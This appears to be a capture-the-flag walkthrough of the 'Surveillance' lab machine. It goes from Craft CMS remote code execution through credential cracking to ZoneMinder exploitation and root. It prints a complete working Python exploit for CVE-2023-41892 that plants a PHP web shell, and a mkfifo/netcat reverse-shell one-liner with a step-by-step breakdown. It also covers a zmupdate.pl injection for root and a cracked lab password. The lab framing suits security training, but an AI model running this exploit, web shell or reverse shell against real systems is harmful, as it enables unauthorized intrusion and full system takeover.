
Main Exploit : https://github.com/Faelian/zoneminder_CVE-2023-26035/tree/main


Cracked Password : 
```
matthew : starcraft122490 
```


## NMAP

![](https://miro.medium.com/v2/resize:fit:700/1*dI5mf5RwZ7_GerZBokaG6Q.png)

Since HTTP is open, let us check if a webpage is viewable in a web browser.

![](https://miro.medium.com/v2/resize:fit:700/1*4FXwiYMLJfuWHKcFVWu3WQ.png)

The webpage seems to be having troubling finding the site. When you encounter something like this, you can just add the IP and the DNS name in the /etc/hosts

![](https://miro.medium.com/v2/resize:fit:444/1*0Sh9Svu6psE1kt694jG-ig.png)

It should be up.

![](https://miro.medium.com/v2/resize:fit:700/1*QQtd8WqsoJ8OHYk4LhrmXg.png)

Since we can view it now, we can now do some directory busting. In this case we will be using GoBuster.

![](https://miro.medium.com/v2/resize:fit:700/1*CurkhaYEFQV9IzGEnUUj5A.png)

![](https://miro.medium.com/v2/resize:fit:700/1*5luBiuAoORu-IlIKaIqJyA.png)

got an admin login, it is running Craft CMS.

![](https://miro.medium.com/v2/resize:fit:700/1*pTiDsD8asMqbbqP_ur4QTw.png)

I viewed the source code of the surveillance.htb/index.php and discovered the version.

![](https://miro.medium.com/v2/resize:fit:700/1*qG31I5SSvvR6cEbnw_jPpg.png)

I did some googling on the version itself and discovered a RCE PoC.

You need to edit this part of the script for it to work.

![](https://miro.medium.com/v2/resize:fit:700/1*eb0uTCFrGvPUucFBAkRa2g.png)

It should get you a shell.

![](https://miro.medium.com/v2/resize:fit:606/1*_6iM_3gvoZPBukBVb8WHbQ.png)

After the first foothold via the PoC, next is to have a decent shell for bash commands.

I found this one liner.

**rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.x.x 4444 >/tmp/f**

I asked ChatGPT on the breakdown on how the one-liner works since it is a new approach for me to get a stable shell.

This is pretty much it:

1. **`**rm /tmp/f**`:**  
— Deletes any existing file named `/tmp/f` to ensure a fresh start.

2. **`**mkfifo /tmp/f**`:**  
— Creates a named pipe (FIFO) named `/tmp/f`. A named pipe is a special type of file that allows processes to communicate.

3. **`**cat /tmp/f | /bin/bash -i 2>&1**`:**  
— Reads from the named pipe (`/tmp/f`) and pipes the content to `/bin/bash` with the `-i` option for an interactive shell.  
— The `2>&1` redirects standard error (file descriptor 2) to standard output (file descriptor 1), ensuring that error messages are also sent through the pipeline.

4. **`**nc 10.10.x.x 4444 >/tmp/f**`:**  
— Initiates a Netcat (`nc`) connection to the IP address `10.10.x.x` on port `4444`.  
— The standard output of the entire pipeline (which includes the output of the Bash shell) is redirected to the named pipe `/tmp/f`. This completes the loop, sending the shell output back into the named pipe, creating a bidirectional communication channel.

— THE IP AND PORT IS CHANGEABLE BASED ON THE USER’S PREFERENCES.

So, to clarify:

- **The `rm` command removes any existing file at `/tmp/f`.  
- The `mkfifo` command creates a named pipe at `/tmp/f`.  
- The `cat | /bin/bash` pipeline creates an interactive Bash shell connected to the named pipe.  
- The `nc` command establishes a network connection and redirects the entire output, including the Bash shell output, back into the named pipe.

You should get a full functioning shell.


This is the exploit code ~
```

import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
```
```

```

![](https://miro.medium.com/v2/resize:fit:648/1*EaAQ93TuHDbYHms0qc1gGQ.png)

I did some looking around and found a backup directory in the storage.

![](https://miro.medium.com/v2/resize:fit:460/1*0Z4-JfFJKNe49iKctyuAtg.png)

After that, I copied it from the **storage folder** to the **web server** that was hosted.

![](https://miro.medium.com/v2/resize:fit:700/1*Vi1eASQCmSJHattIBYlJ6A.png)

After that, performed a **wget command** to extract the file.

![](https://miro.medium.com/v2/resize:fit:700/1*Kj4pU1uQrH53HDuavVyNBw.png)

Extracted the file in the zip then displayed it for checking for particular credentials. There’s a user named Matthew, alongside a hashed password.

![](https://miro.medium.com/v2/resize:fit:700/1*gm1228h29FpfL8opS0tUzw.png)

I used Hash-Identifier to verify what hash is used in matthew’s password. It is possibly made in SHA-256.

![](https://miro.medium.com/v2/resize:fit:700/1*lDT2SetFaTewmkIkbXIwIQ.png)

After that, I inserted it to a text file then used hashcat for the cracking of the password.

![](https://miro.medium.com/v2/resize:fit:700/1*GQUSpFI0rl2eoycfUarCAQ.png)

![](https://miro.medium.com/v2/resize:fit:593/1*rAfCAOF7LnBEVfU41CgArQ.png)

Password is cracked.

![](https://miro.medium.com/v2/resize:fit:664/1*OAEhLkU2oluTT08g7CIUXw.png)

Tried it on SSH and it worked.

![](https://miro.medium.com/v2/resize:fit:581/1*xndFRk2MaWC1fgqw6PIZWA.png)

![](https://miro.medium.com/v2/resize:fit:315/1*W2vnrw2bliy5aXt_CcvzQA.png)

FLAG!

I ran linpeas from my python server for checking for credentials.

Some mysql credentials. I think this is the same database that was stored in the storage/backups directory.

![](https://miro.medium.com/v2/resize:fit:700/1*wrd1L9Lw7aKJ1GPeWTxYZQ.png)

Some password in something called zoneminder.

![](https://miro.medium.com/v2/resize:fit:700/1*lCJgUjPboE4JqSwukpJjLw.png)

some configs to the “zoneminder”

![](https://miro.medium.com/v2/resize:fit:700/1*WG1WIHXpCTzcA0nlWCsRMg.png)

Upon researching, zoneminder is a software used for monitoring.

![](https://miro.medium.com/v2/resize:fit:700/1*RoTeUTVL-b3c6BzimmlvAQ.png)

Since it is stored locally, we will be doing a portforward using SSH.

![](https://miro.medium.com/v2/resize:fit:700/1*ZO3heP-NpMQydIo0p3R08Q.png)

Once it logs in, check if the content can be displayed locally.

You should see something like this.

![](https://miro.medium.com/v2/resize:fit:700/1*33a2Kn_2ybiUKrXqq5V14g.png)

Since it is a login page, we should find some default credentials for this, apparently it was admin:admin but it never works.

Let’s find the version and use it as a reference for finding exploits, apparently it runs the 1.36.32 version.

![](https://miro.medium.com/v2/resize:fit:700/1*3r8N97_fft8AnXD78Go_Eg.png)

There’s an exploit PoC that involves Zoneminder.

![](https://miro.medium.com/v2/resize:fit:700/1*u3BoQKwqll0KMcjDR1_MIQ.png)

It sends the payload but it won’t connect.

![](https://miro.medium.com/v2/resize:fit:662/1*5NjulWNJBWO_azgI5ZBx7w.png)

Payload sent

![](https://miro.medium.com/v2/resize:fit:342/1*wVb4Dig0R0soKQDUbPwP1A.png)

No connection

I tried other options after that.

Metasploit has one exploit that involves snapshots in zoneminder.

![](https://miro.medium.com/v2/resize:fit:700/1*Nn-NwJVmdGXBUq6gD2wxnA.png)

The metasploit script runs but the POC doesn’t, weird.

![](https://miro.medium.com/v2/resize:fit:700/1*x83pAczTKjTIf_DbFhTagw.png)

Shell Access

sudo -l for checking if we can do LPE with it.

![](https://miro.medium.com/v2/resize:fit:700/1*ppMshdWh9eQBmgIsz8hxpQ.png)

After that, spawn a stable shell via python.

![](https://miro.medium.com/v2/resize:fit:414/1*UocvO3tS6QdqIxPOtXsabw.png)

after a few minutes of searching in the internet, I found one way to get to root.

![](https://miro.medium.com/v2/resize:fit:700/1*RsPoeA7gKoRZJgUM39JiwA.png)

in the user parameter in zmupdate.pl, you can input a file directory instead of a user then attach the password that we found a few steps ago.

in this case, we use it for a reverse shell script. then transfer it via the **python server** and **wget**.

![](https://miro.medium.com/v2/resize:fit:321/1*SXZbATEUcRIiXIkGyPlAlA.png)

busybox is used to access the netcat command itself, without it the script will not run.

You can place it anywhere but it is good practice to place things in tmp folder.

prepare the attacker to listen to the ports.

![](https://miro.medium.com/v2/resize:fit:248/1*1FkmWMWBzLm5ifc4zNcjjw.png)

then run the script.

![](https://miro.medium.com/v2/resize:fit:700/1*of72stdkAE477kG-2slVow.png)

![](https://miro.medium.com/v2/resize:fit:551/1*z8VfUQ-6tody5JKgB0ZmOQ.png)

You should get root access after running it

Root Access.

![](https://miro.medium.com/v2/resize:fit:603/1*CMuSy1Sr75GyHsY9VySKTw.png)